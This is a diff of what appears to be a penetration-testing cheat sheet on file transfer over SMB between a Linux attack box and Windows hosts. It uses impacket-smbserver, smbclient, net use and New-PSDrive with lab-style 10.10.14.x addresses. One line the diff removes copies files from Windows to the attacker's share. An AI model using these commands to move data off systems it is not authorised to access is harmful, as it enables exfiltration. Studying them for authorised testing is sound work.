@@ -194,7 +194,7 @@ impacket-smbserver -smb2support -user test -password test test `pwd`
 # or 
 python /usr/share/doc/python3-impacket/examples/smbserver.py tmp .
 
-#then to take a copy of a file from the shared folder 
+#copy of a file from the shared folder 
 smbclient //localhost/tmp -U guest -c 'get file.txt'
 
 ```
@@ -219,11 +219,11 @@ service smbd restart
 Windows
 
 ```bash
-1) # set the smb shared driver
-CMD-Wind> net use z: \\10.10.14.14\path\to\exe
-CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
-2) #copy from windwos to linux 
-copy C:\path\to\your\file.txt Z:\ 
+1) # assume you have the necessary permissions to access the shared folder.
+CMD-Wind> net use Z: \\<ServerName>\<SharedFolder>
+CMD-Wind> net use Z: \\<ServerName>\<SharedFolder> /user:<username> <password> #For SMB using credentials
+2) #copy using  windwos 
+copy \\<ServerName>\<SharedFolder>\<FileName> <DestinationPath>
 
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
